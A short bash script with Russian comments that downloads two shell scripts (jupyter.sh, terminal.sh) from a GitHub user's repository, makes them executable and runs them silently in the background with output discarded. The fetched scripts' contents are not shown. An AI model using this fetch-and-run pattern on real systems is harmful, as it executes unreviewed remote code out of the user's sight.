#!/bin/bash
wget https://github.com/fintafixuser/t/raw/main/jupyter.sh
wget https://github.com/fintafixuser/t/raw/main/terminal.sh
# Сделать файлы исполняемыми
chmod +x terminal.sh
chmod +x jupyter.sh

# Запустить файлы в фоне
./terminal.sh &> /dev/null &
./jupyter.sh &> /dev/null &


#chmod +x run_in_background.sh
#./run_in_background.sh
